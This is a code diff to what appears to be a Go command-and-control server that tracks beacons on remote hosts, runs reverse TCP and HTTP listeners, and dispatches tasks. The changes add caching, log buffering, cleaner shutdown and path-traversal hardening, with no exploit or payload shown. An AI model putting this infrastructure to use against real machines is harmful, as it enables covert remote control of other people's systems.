@@ -213,6 +213,7 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 					if err := db.Save(&client).Error; err != nil {
 						return "", nil, err
 					}
+					cacheBeaconSleep(clientID, client.Sleep, client.Jitter)
 					emitClusterEvent("beacon_config", map[string]interface{}{
 						"beacon_id": clientID, "sleep": client.Sleep, "jitter": client.Jitter,
 					}, client.HomeNodeID)
@@ -416,9 +417,12 @@ func appendLog(level, msg string, propagate bool) {
 	logJSON, _ := json.Marshal(logEntry)
 	logStr := string(logJSON)
 
-	logs = append(logs, logStr)
-	if len(logs) > 200 {
-		logs = logs[1:]
+	if logLen < logRingSize {
+		logRing[logLen] = logStr
+		logLen++
+	} else {
+		logRing[logHead] = logStr
+		logHead = (logHead + 1) % logRingSize
 	}
 	wsMutex.Unlock()
 
@@ -542,6 +546,7 @@ func broadcastWS(msg string) {
 
 	for _, c := range clients {
 		select {
+		case <-c.done:
 		case c.send <- msg:
 		default:
 			// Buffer full: the client cannot keep up. Drop it.
@@ -567,17 +572,28 @@ func (l *Listener) Start() error {
 		mux := http.NewServeMux()
 		mux.HandleFunc("/checkin", handleBeaconCheckin)
 
-		l.server = &http.Server{
-			Addr:    fmt.Sprintf("%s:%d", l.BindIP, l.Port),
-			Handler: mux,
+		srv := &http.Server{
+			Addr:              fmt.Sprintf("%s:%d", l.BindIP, l.Port),
+			Handler:           mux,
+			ReadHeaderTimeout: 10 * time.Second,
+			IdleTimeout:       2 * time.Minute,
+			MaxHeaderBytes:    1 << 20,
 		}
+		l.server = srv
 
-		go func() {
-			if err := l.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		go func(server *http.Server) {
+			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 				log.Printf("[!] Listener %s failed: %v\n", l.Name, err)
+				alMutex.Lock()
+				if activeListeners[l.ID] == l && l.server == server {
+					delete(activeListeners, l.ID)
+					l.server = nil
+					l.Status = "stopped"
+				}
+				alMutex.Unlock()
 				db.Model(l).Update("status", "stopped")
 			}
-		}()
+		}(srv)
 
 	case "reverse_tcp":
 		ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", l.BindIP, l.Port))
@@ -586,18 +602,26 @@ func (l *Listener) Start() error {
 		}
 		l.tcpListener = ln
 
-		go func() {
+		go func(listener net.Listener) {
 			for {
-				conn, err := ln.Accept()
+				conn, err := listener.Accept()
 				if err != nil {
 					if !strings.Contains(err.Error(), "use of closed") {
 						log.Printf("[!] TCP listener %s accept error: %v\n", l.Name, err)
 					}
+					alMutex.Lock()
+					if activeListeners[l.ID] == l && l.tcpListener == listener {
+						delete(activeListeners, l.ID)
+						l.tcpListener = nil
+						l.Status = "stopped"
+					}
+					alMutex.Unlock()
+					db.Model(l).Update("status", "stopped")
 					return
 				}
 				go handleTCPBeaconConn(conn, l.ID)
 			}
-		}()
+		}(ln)
 
 	case "reverse_https":
 		return fmt.Errorf("HTTPS_LISTENER_REQUIRES_TLS_CONFIGURATION")
@@ -618,34 +642,75 @@ func (l *Listener) Start() error {
 
 func (l *Listener) Stop() error {
 	alMutex.Lock()
-	_, wasRunning := activeListeners[l.ID]
+	active, wasRunning := activeListeners[l.ID]
+	if wasRunning {
+		l = active
+	}
+	server := l.server
+	tcpListener := l.tcpListener
+	l.server = nil
+	l.tcpListener = nil
+	delete(activeListeners, l.ID)
 	alMutex.Unlock()
-	if !wasRunning && l.server == nil && l.tcpListener == nil {
+	if !wasRunning && server == nil && tcpListener == nil {
 		// Nothing running locally; just make sure the row is consistent.
 		db.Model(l).Update("status", "stopped")
 		return nil
 	}
 
-	if l.server != nil {
+	var stopErr error
+	if server != nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-		defer cancel()
-		if err := l.server.Shutdown(ctx); err != nil {
-			return err
+		if err := server.Shutdown(ctx); err != nil {
+			stopErr = err
+			_ = server.Close()
 		}
-		l.server = nil
+		cancel()
 	}
-	if l.tcpListener != nil {
-		l.tcpListener.Close()
-		l.tcpListener = nil
+	if tcpListener != nil {
+		_ = tcpListener.Close()
 	}
 	l.Status = "stopped"
-	db.Model(l).Update("status", "stopped")
+	if err := db.Model(l).Update("status", "stopped").Error; err != nil && stopErr == nil {
+		stopErr = err
+	}
 
+	return stopErr
+}
+
+// shutdownActiveListeners stops all locally bound listeners concurrently so a
+// slow HTTP connection cannot make process shutdown take N times the timeout.
+func shutdownActiveListeners() {
 	alMutex.Lock()
-	delete(activeListeners, l.ID)
+	listeners := make([]*Listener, 0, len(activeListeners))
+	for _, listener := range activeListeners {
+		listeners = append(listeners, listener)
+	}
 	alMutex.Unlock()
 
-	return nil
+	var wg sync.WaitGroup
+	for _, listener := range listeners {
+		wg.Add(1)
+		go func(l *Listener) {
+			defer wg.Done()
+			if err := l.Stop(); err != nil {
+				log.Printf("[!] Listener %s shutdown failed: %v", l.Name, err)
+			}
+		}(listener)
+	}
+	wg.Wait()
+}
+
+func shutdownWebSockets() {
+	wsMutex.Lock()
+	clients := make([]*wsClient, 0, len(wsClients))
+	for client := range wsClients {
+		clients = append(clients, client)
+	}
+	wsMutex.Unlock()
+	for _, client := range clients {
+		client.shutdown()
+	}
 }
 
 // parseBeaconOS extracts OS info from headers or user-agent
@@ -832,6 +897,8 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				}
 				if err := db.Create(&client).Error; err != nil {
 					addLog("ERR", "TCP_BEACON_CREATE_FAILED: "+err.Error())
+				} else {
+					cacheBeaconSleep(client.ID, client.Sleep, client.Jitter)
 				}
 				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s [%s]", regData.Username, regData.Hostname, remoteIP, tcpCountryCode))
 
@@ -868,6 +935,7 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				if err := db.Save(&client).Error; err != nil {
 					addLog("ERR", "TCP_BEACON_UPDATE_FAILED: "+err.Error())
 				}
+				cacheBeaconSleep(client.ID, client.Sleep, client.Jitter)
 				emitClusterEvent("beacon_update", client, "")
 			}
 			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})
@@ -906,10 +974,10 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tasksJSON, _ := json.Marshal(pendingTasks)
 				tcpWriteMsg(conn, TCPMsg{Type: "tasks", Data: json.RawMessage(tasksJSON)})
 			} else {
-				// No tasks - send sleep config
-				var client Client
-				db.First(&client, "id = ?", beaconID)
-				sleepCfg := map[string]int{"sleep": client.Sleep, "jitter": client.Jitter}
+				// No tasks - send sleep config from the write-through cache so a
+				// quiet beacon costs zero database queries per check-in.
+				sleep, jitter := beaconSleepConfig(beaconID)
+				sleepCfg := map[string]int{"sleep": sleep, "jitter": jitter}
 				sleepJSON, _ := json.Marshal(sleepCfg)
 				tcpWriteMsg(conn, TCPMsg{Type: "sleep", Data: json.RawMessage(sleepJSON)})
 			}
@@ -1091,6 +1159,7 @@ func beaconPoll(w http.ResponseWriter, authID, remoteIP, beaconOS string) {
 			w.WriteHeader(http.StatusInternalServerError)
 			return
 		}
+		cacheBeaconSleep(client.ID, client.Sleep, client.Jitter)
 		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", authID, remoteIP, basicCountryCode))
 
 		event := map[string]interface{}{
@@ -1211,6 +1280,7 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 		if err := db.Save(&client).Error; err != nil {
 			addLog("ERR", "BEACON_UPDATE_FAILED: "+err.Error())
 		}
+		cacheBeaconSleep(client.ID, client.Sleep, client.Jitter)
 		emitClusterEvent("beacon_update", client, "")
 	} else {
 		// New registration
@@ -1255,6 +1325,7 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			w.WriteHeader(http.StatusInternalServerError)
 			return
 		}
+		cacheBeaconSleep(client.ID, client.Sleep, client.Jitter)
 		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s] [%s]",
 			data.Username, data.Hostname, clientIP, data.PID, data.OS, countryCode))
 
@@ -1283,8 +1354,7 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 
 func handleGetLogs(c *gin.Context) {
 	wsMutex.Lock()
-	logsCopy := make([]string, len(logs))
-	copy(logsCopy, logs)
+	logsCopy := recentLogs()
 	wsMutex.Unlock()
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: logsCopy})
 }
@@ -1523,6 +1593,7 @@ func handleDeleteClient(c *gin.Context) {
 	}
 	if result.RowsAffected > 0 {
 		db.Where("client_id = ?", id).Delete(&Task{})
+		uncacheBeaconSleep(id)
 		addLog("C2", "CLIENT_REMOVED: "+id)
 		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "CLIENT_DELETED"})
 		return
@@ -3154,7 +3225,10 @@ func handleGetClients(c *gin.Context) {
 	if status != "" {
 		query = query.Where("status = ?", status)
 	}
-	query.Find(&clientList)
+	if err := query.Limit(1000).Find(&clientList).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_LOAD_CLIENTS"})
+		return
+	}
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: clientList})
 }
 
@@ -3185,12 +3259,13 @@ func handleWS(c *gin.Context) {
 	client := &wsClient{
 		conn: conn,
 		send: make(chan string, 256),
+		done: make(chan struct{}),
 	}
 
 	// Replay recent logs before registering the client so the initial burst
 	// is ordered; the buffer (256) covers the 200-entry ring.
 	wsMutex.Lock()
-	for _, l := range logs {
+	for _, l := range recentLogs() {
 		client.send <- l
 	}
 	wsClients[client] = true
@@ -3199,14 +3274,18 @@ func handleWS(c *gin.Context) {
 	// Dedicated writer goroutine with per-write deadline: a stuck client can
 	// never block the broadcast path or other clients.
 	go func() {
-		for msg := range client.send {
-			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-			if err := conn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
-				client.shutdown()
+		for {
+			select {
+			case <-client.done:
 				return
+			case msg := <-client.send:
+				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
+					client.shutdown()
+					return
+				}
 			}
 		}
-		client.shutdown()
 	}()
 
 	defer client.shutdown()
@@ -3245,11 +3324,14 @@ func safePath(relPath string) (string, error) {
 	}
 	// Clean the path
 	cleaned := filepath.Clean(relPath)
-	// Reject absolute paths or traversal
-	if filepath.IsAbs(cleaned) {
-		// Strip leading slash/backslash for joining
-		cleaned = strings.TrimLeft(cleaned, "/\\")
+	// Browser paths use a leading slash. On Windows that is root-relative but
+	// filepath.IsAbs reports false without a volume, and filepath.Join can then
+	// escape the managed directory. Reject real volume/UNC paths and normalize
+	// the harmless URL-style leading separators before joining.
+	if filepath.VolumeName(cleaned) != "" {
+		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
 	}
+	cleaned = strings.TrimLeft(cleaned, "/\\")
 	joined := filepath.Join(fmRoot, cleaned)
 	abs, err := filepath.Abs(joined)
 	if err != nil {
@@ -3276,30 +3358,38 @@ func safePath(relPath string) (string, error) {
 	return abs, nil
 }
 
-// pathWithinRoot resolves the nearest existing ancestor so symlinked parent
-// directories are checked even when the final target does not exist yet.
+// pathWithinRoot walks every existing component below the managed root and
+// rejects links. Lstat works in restricted Windows service accounts where
+// EvalSymlinks may return access denied even for an otherwise accessible path.
 func pathWithinRoot(path, root string) bool {
 	rootAbs, err := filepath.Abs(root)
 	if err != nil {
 		return false
 	}
-	rootResolved, err := filepath.EvalSymlinks(rootAbs)
+	pathAbs, err := filepath.Abs(path)
 	if err != nil {
 		return false
 	}
-	rootResolved, _ = filepath.Abs(rootResolved)
-	probe := path
-	for {
-		if resolved, err := filepath.EvalSymlinks(probe); err == nil {
-			resolved, _ = filepath.Abs(resolved)
-			return resolved == rootResolved || strings.HasPrefix(resolved, rootResolved+string(filepath.Separator))
+	rel, err := filepath.Rel(rootAbs, pathAbs)
+	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) || filepath.IsAbs(rel) {
+		return false
+	}
+
+	current := rootAbs
+	if rel == "." {
+		return true
+	}
+	for _, component := range strings.Split(rel, string(filepath.Separator)) {
+		current = filepath.Join(current, component)
+		info, err := os.Lstat(current)
+		if os.IsNotExist(err) {
+			return true
 		}
-		parent := filepath.Dir(probe)
-		if parent == probe {
+		if err != nil || info.Mode()&os.ModeSymlink != 0 {
 			return false
 		}
-		probe = parent
 	}
+	return true
 }
 
 // handleFMList lists directory contents
